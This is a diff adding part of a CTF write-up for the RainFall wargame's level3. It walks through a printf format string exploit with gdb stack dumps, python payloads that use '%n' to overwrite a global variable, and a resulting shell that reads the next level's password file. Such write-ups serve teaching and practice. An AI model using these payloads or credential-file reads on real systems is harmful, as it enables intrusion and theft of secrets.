@@ -110,3 +110,66 @@ String for `printf` lies on the stack and with the help of format string we can 
 	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 00000200 b7fd1ac0 b7ff37d0 **41414141** 41414141 41414141 41414141 41414141 41414141 41414141 41414141
 
 Where our AAA string starts from the **fourth** `printf` argument. Let's try to rewrite address:
+
+	level3@RainFall:~$ python -c "print('AAAA' + '\x8c\x98\x04\x08' + 'BBBB' + '%x ' * 120)" > /tmp/1lev3
+
+	Starting program: /home/user/level3/level3 < /tmp/1lev3
+	Breakpoint 4, 0x080484c7 in v ()
+	(gdb) x/30wx $esp
+		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+		0xbffff4f0:	0x00000000	0xb7e2b900	0x00000001	0xb7fef305
+		0xbffff500:	0xbffff558	0xb7fde2d4	0xb7fde334	0x00000007
+
+	(gdb) c
+		Continuing.
+
+	Breakpoint 1, 0x080484cc in v ()
+	(gdb) x/30wx $esp
+		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+		0xbffff4f0:	0x41414141	**0x0804988c**	0x42424242	0x25207825
+		0xbffff500:	0x78252078	0x20782520	0x25207825	0x78252078
+
+All the other 0x25207825 are ‘%x %’ strings. So we can rewrite address of the global variable to the buffer. And then in order to change value of the variable we need to use %n: 
+
+> There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice.
+
+So before %n we need to have 64 bytes in the string.
+
+	% python -c 'print "\x8c\x98\x04\x08" + "%10u" * 3 + "JUNK" * 7 + "AA" + "%n"' > /tmp/3lev3
+
+Where functionally:
+
+	- \x8c\x98\x04\x08 - address of the global variable
+	- "%10u" * 3 - alignment of stack so that we "pointer" to the 4th argument in printf (beginning of buffer on stack)
+	- "JUNK" * 7 + "AA" - bytes to have 64 bytes before %n
+	- "%n" that rewrites value of the variable under address that lies in the beginning of the buffer
+
+Where bytes number:
+
+	- \x8c\x98\x04\x08 - 4 bytes
+	- "%10u" * 3 - 30 bytes (30 spaces, we do not print anything with this printf so there will be only spaces)
+	- "JUNK" * 7 + "AA" - 30 bytes
+
+That equals 64 bytes.
+
+	Breakpoint 1, 0x080484cc in v ()
+	(gdb) x/30wx $esp
+		0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+		0xbffff4f0:	**0x0804988c**	*0x75303125*	*0x75303125*	*0x75303125*
+		0xbffff500:	0x41414141	0x41414141	0x41414141	0x41414141
+		0xbffff510:	0x41414141	0x41414141	0x41414141	0x6e254141
+
+It is very difficult to understand it if you do not play with the line and look on gdb.
+
+# Result
+
+	level3@RainFall:~$ cat /tmp/3lev3 - | ./level3
+	�       51230868179843086956496JUNKJUNKJUNKJUNKJUNKJUNKJUNKAA
+	Wait what?!
+	whoami
+	level4
+	cat /home/user/level4/.pass
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+	^C
+
+Why do we use `cat -` command? Because even if we break the level and call shell, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.
